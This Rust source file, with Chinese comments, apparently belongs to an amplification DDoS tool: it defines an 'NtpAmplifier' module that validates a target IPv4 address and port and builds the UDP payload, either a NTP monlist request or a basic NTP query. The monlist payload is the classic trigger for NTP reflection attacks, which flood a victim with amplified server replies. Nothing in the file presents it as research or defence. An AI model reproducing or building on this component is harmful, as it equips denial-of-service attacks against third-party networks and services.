use std::str::FromStr;
use serde::Deserialize;
use serde_json::Value;
use super::Amplifier;


#[derive(Debug, Deserialize)]
struct Config {
    ip: String,
    port: u16,
    monlist: bool, // 是否使用monlist
}


impl Config {
    /// 检验配置文件的有效性
    /// 如果有效，则返回None
    /// 如果无效，则返回错误信息
    fn check(&self) -> Option<String> {
        if self.ip.len() > 255 {
            return Some("IP地址的长度不能超过255".to_string());
        }
        if !self.ip.is_ascii() {
            return Some("IP地址必须是ASCII字符".to_string());
        }
        // 由于目前只支持IPv4，所以检查是否是IPv4
        if let Err(_) = std::net::Ipv4Addr::from_str(&self.ip) {
            return Some("IP地址必须是IPv4".to_string());
        }
        None
    }
}


pub struct NtpAmplifier {
    config: Config,
}

impl Amplifier for NtpAmplifier {
    fn new(config: Value) -> Result<Self, String> {
        if let Ok(config) = serde_json::from_value::<Config>(config) {
            if let Some(err) = config.check() {
                Err(err)
            } else {
                Ok(NtpAmplifier {
                    config
                })
            }
        } else {
            Err("配置文件不是有效的JSON".to_string())
        }
    }

    fn make_udp_payload(&self) -> Vec<u8> {
        // 制作一个NTP请求
        if self.config.monlist {
            // 发送monlist请求
            vec![
                0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            ]
        } else {
            let mut buf = [0u8; 48];
            buf[0] = 0x23;
            buf.to_vec()
        }
    }

    fn get_dest_ip(&self) -> String {
        self.config.ip.clone()
    }

    fn get_dest_port(&self) -> u16 {
        self.config.port
    }
}